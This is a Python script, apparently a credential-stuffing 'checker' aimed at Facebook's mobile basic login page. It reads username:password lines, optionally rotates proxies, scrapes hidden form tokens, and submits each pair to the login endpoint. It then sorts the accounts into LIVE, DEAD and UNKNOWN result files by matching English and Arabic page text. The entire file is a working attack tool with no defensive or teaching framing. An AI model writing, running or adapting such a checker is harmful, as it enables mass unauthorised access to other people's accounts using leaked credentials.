import requests as rq
import re
import random as rand
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma"    : "no-cache",
    "Accept"    : "*/*",
    "Origin"    : "https://mbasic.facebook.com",
    "Referer"   : "https://mbasic.facebook.com/"
    }
Q1 = input("""Do you use proxies ?
[1] Yes
[2] NO
>>> """)
Q2 = input("""Do you use phone numbers ?
[1] Yes
[2] NO
>>> """)
_input = open("input.txt","r").readlines()
if Q1 == "1" :
    proxies = open("proxies.txt","r").readlines()
    rand.shuffle(proxies)
else :
    pass
print(len(list(_input)))
def start(USER,PASS):
    if Q1 == "1" :
        proxy = rand.choice(proxies)
    else :
        pass
    ###----CookieJar----####
    cookieJar = rq.cookies.RequestsCookieJar()
    ###----FirstRequest----###
    if Q1 == "1" :
        Rq_Get_1 = rq.get("https://mbasic.facebook.com/",proxies={"http":"http://"+proxy,"https":"https://"+proxy})
    else :
        Rq_Get_1 = rq.get("https://mbasic.facebook.com/")
    ###----Stuff----###
    m_ts = Rq_Get_1.text[re.search('name="m_ts" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="li"',Rq_Get_1.text).start()]
    li = Rq_Get_1.text[re.search('name="li" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="try_number"',Rq_Get_1.text).start()]
    jazoest = Rq_Get_1.text[re.search('name="jazoest" value="',Rq_Get_1.text).end():re.search('" autocomplete="off" /><input type="hidden" name="m_ts',Rq_Get_1.text).start()]
    lsd = Rq_Get_1.text[re.search('name="lsd" value="',Rq_Get_1.text).end():re.search('" autocomplete="off" /><input type="hidden" name="jazoest"',Rq_Get_1.text).start()]
    ###----UpdateJar----###
    cookieJar.update(Rq_Get_1.cookies)
    ###----PostRq----###
    Rq_Post_0 = rq.session()
    Rq_Post_0.headers.update(headers)
    Rq_Post_0.cookies = cookieJar
    Data = {
            "lsd":lsd,
            "jazoest":jazoest,
            "m_ts":m_ts,
            "li":li,
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":USER,
            "pass":PASS,
            "login":"Log+In"
            }
    if Q1 == "1" :
        Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data,proxies={"http":"http://"+proxy,"https":"https://"+proxy})
    else :
        Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data)
    #with open("result.html","w") as result:
     #   result.write(Rq_Post_0_send.text)
    if "هل نسيت كلمة السر؟" in Rq_Post_0_send.text or "Forgotten password?" in Rq_Post_0_send.text :
        print(USER.rstrip()+":"+PASS.rstrip()+"[DEAD]")
        with open("resultDEAD.text","a") as resultDEAD:
            resultDEAD.write(USER.rstrip()+":"+PASS.rstrip())
    elif "https://mbasic.facebook.com/login/save-device" in Rq_Post_0_send.url or "بحث عن أصدقاء" in Rq_Post_0_send.text or "Find Friends" in Rq_Post_0_send.text :
        print(USER.rstrip()+":"+PASS.rstrip()+"[LIVE]")
        with open("resultsLIVE.text","a") as resultLIVE:
            resultLIVE.write(USER.rstrip()+":"+PASS.rstrip())
    else :
        with open("resultsUNKOWN.text","a") as resultsUNKOWN:
            resultsUNKOWN.write(USER.rstrip()+":"+PASS.rstrip())
i = 0
while i <= len(list(_input)) :
    if Q2 == "1":
        USER = str(_input[i])
        PASS = str(_input[i])
    else:
        USER, PASS = _input[i].split(":")
    start(USER,PASS)
    i += 1
    if i == len(list(_input)):
        print("finished")
        break

